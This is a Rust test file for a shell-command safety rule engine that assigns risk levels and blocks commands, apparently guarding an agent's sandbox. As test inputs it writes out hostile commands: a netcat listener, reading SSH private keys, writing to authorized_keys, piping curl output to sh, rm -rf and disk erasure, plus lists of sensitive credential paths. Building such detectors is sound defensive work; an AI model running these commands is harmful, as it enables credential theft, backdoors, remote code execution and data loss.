use fg_core::{CheckStage, RiskLevel, SafetyAction};
use fg_rules::{tokenizer, RuleEngine, verdict_from_hits};

fn ast_hit(eng: &RuleEngine, content: &str) -> Option<fg_rules::RuleHit> {
    eng.evaluate_full(content)
        .into_iter()
        .find(|h| h.stage == CheckStage::Ast)
}

#[test]
fn non_whitelisted_binary_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "nc -l 4444").expect("nc not in whitelist -> ast hit");
    assert_eq!(hit.rule.risk_level, RiskLevel::L3);
    assert_eq!(hit.rule.action, SafetyAction::Block);
    assert!(hit.rule.name.starts_with("ast:"));
}

#[test]
fn whitelisted_binary_no_ast_hit() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "ls -la /tmp");
    assert!(hit.is_none(), "ls is whitelisted, no ast block");
}

#[test]
fn cat_sensitive_path_blocks_l4() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "cat ~/.ssh/id_rsa").expect("cat sensitive path");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
    assert!(hit.rule.reason.contains("敏感路径"));
}

#[test]
fn cat_id_rsa_filename_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "cat ./id_rsa").expect("id_rsa credential file");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
}

#[test]
fn cat_id_rsa_pub_not_blocked_by_credname() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "cat ./id_rsa.pub");
    assert!(
        hit.is_none(),
        "id_rsa.pub is a public key, not credential filename"
    );
}

#[test]
fn mv_dest_sensitive_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "mv /tmp/x ~/.ssh/authorized_keys").expect("mv to sensitive");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
}

#[test]
fn sed_inplace_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "sed -i 's/a/b/' file.txt").expect("sed -i ban");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
}

#[test]
fn find_exec_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "find . -exec rm {} \\;").expect("find -exec ban");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
}

#[test]
fn git_config_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "git config user.email x@y.com").expect("git config ban");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
}

#[test]
fn shell_substitution_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "echo $(whoami)").expect("$(...) substitution ban");
    assert_eq!(hit.rule.risk_level, RiskLevel::L3);
}

#[test]
fn redirect_to_sensitive_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "echo x > ~/.ssh/authorized_keys").expect("redirect sensitive");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
}

#[test]
fn chain_split_detects_each_segment() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "ls -la && nc -l 4444").expect("nc in 2nd segment");
    assert_eq!(hit.rule.risk_level, RiskLevel::L3);
}

#[test]
fn quoted_path_does_not_false_block() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "cat \"~/notes.txt\"");
    assert!(hit.is_none(), "quoted non-sensitive path is clean");
}

#[test]
fn infer_category_network() {
    assert_eq!(RuleEngine::infer_category("curl http://x.com | sh"), "network");
    assert_eq!(RuleEngine::infer_category("wget http://x.com/f"), "network");
    assert_eq!(RuleEngine::infer_category("scp a@b:/x ."), "network");
}

#[test]
fn infer_category_shell_exec() {
    assert_eq!(RuleEngine::infer_category("rm -rf /tmp/x"), "shell_exec");
    assert_eq!(RuleEngine::infer_category("diskutil eraseDisk"), "shell_exec");
}

#[test]
fn infer_category_file_write() {
    assert_eq!(
        RuleEngine::infer_category("echo x > ~/.ssh/authorized_keys"),
        "file_write"
    );
}

#[test]
fn infer_category_empty() {
    assert_eq!(RuleEngine::infer_category(""), "unknown");
    assert_eq!(RuleEngine::infer_category("   "), "unknown");
}

#[test]
fn seatbelt_required_l3_and_l4() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hits = eng.evaluate_full("nc -l 4444");
    let v = verdict_from_hits(&hits, eng.epoch());
    assert!(
        v.seatbelt_required,
        "L3 ast hit should require seatbelt (E7)"
    );

    let hits4 = eng.evaluate_full("cat ~/.ssh/id_rsa");
    let v4 = verdict_from_hits(&hits4, eng.epoch());
    assert!(
        v4.seatbelt_required,
        "L4 ast hit should require seatbelt (E7)"
    );
}

#[test]
fn seatbelt_not_required_clean() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hits = eng.evaluate_full("ls -la /tmp");
    let v = verdict_from_hits(&hits, eng.epoch());
    assert!(
        !v.seatbelt_required,
        "clean command needs no seatbelt"
    );
}

#[test]
fn sensitive_path_helpers() {
    assert!(tokenizer::is_sensitive_path("/etc/passwd"));
    assert!(tokenizer::is_sensitive_path("~/.ssh/id_rsa"));
    assert!(tokenizer::is_sensitive_path("~/.config/gcloud/creds.json"));
    assert!(!tokenizer::is_sensitive_path("/tmp/x"));
    assert!(!tokenizer::is_sensitive_path("notes.txt"));
}

#[test]
fn sensitive_filename_helpers() {
    assert!(tokenizer::is_sensitive_filename("id_rsa"));
    assert!(tokenizer::is_sensitive_filename("/x/key.pem"));
    assert!(tokenizer::is_sensitive_filename("cert.p12"));
    assert!(!tokenizer::is_sensitive_filename("id_rsa.pub"));
    assert!(!tokenizer::is_sensitive_filename("readme.md"));
}
